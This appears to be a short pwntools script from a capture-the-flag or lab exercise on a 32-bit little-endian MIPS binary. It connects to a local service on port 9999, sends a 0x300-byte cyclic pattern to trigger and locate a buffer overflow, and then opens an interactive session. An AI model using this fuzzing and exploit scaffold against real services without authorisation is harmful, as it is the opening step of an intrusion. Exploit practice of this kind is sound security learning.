from pwn import *
context(log_level='debug',arch='mips',endian='little',bits=32)

io=remote("127.0.0.1",9999)

io.recvuntil(b"Send Me Bytes:")

payload=cyclic(0x300)

io.sendline(payload)

io.interactive()
